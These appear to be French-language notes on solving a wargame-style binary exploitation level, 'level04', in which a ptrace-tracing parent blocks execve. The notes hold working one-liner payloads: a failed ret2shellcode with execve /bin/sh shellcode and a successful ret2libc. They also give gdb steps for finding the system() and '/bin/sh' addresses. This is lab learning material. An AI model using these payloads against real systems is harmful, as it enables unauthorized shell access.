

(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*(156-21) + "\x14\xd7\xff\xff"'; cat) | ./level04

ret2shellcode (échoue)             
────────────────────────           
parent (tracer)                    
   └─ child  [TRACÉ]               
        int 0x80  eax=11           
        │                          
        ▼                          
   parent voit ORIG_EAX=11         
   → kill -9                       
   ✗ pas de shell                 

L'execve() est un syscall, le ptrace du parent kill le processus des qu'il le detecte.



(python -c 'print "A"*(156) + "\xd0\xae\xe6\xf7" + "1234" + "\xec\x97\xf8\xf7"'; cat) | ./level04

    ret2libc (réussit)
 ────────────────────────
 parent (tracer)
    └─ child  [TRACÉ]
        system()
           └─ fork()
               └─ grandchild [NON tracé]
                     execve("/bin/sh")
                      ▼
                  ✓ shell

Le system() fait un premier fork qui lui n'est pas ptrace puis execve("/bin/sh") le premier parent ne detecte pas l'appel a execve()


comment recuperer les adresses


b main

run

p system
-> adresse de la fonction system
info proc mappings 

recup adresse debut et fin de la lib-c

find adresse-debut, adresse-fin, "/bin/sh"
-> adresse de "/bin/sh"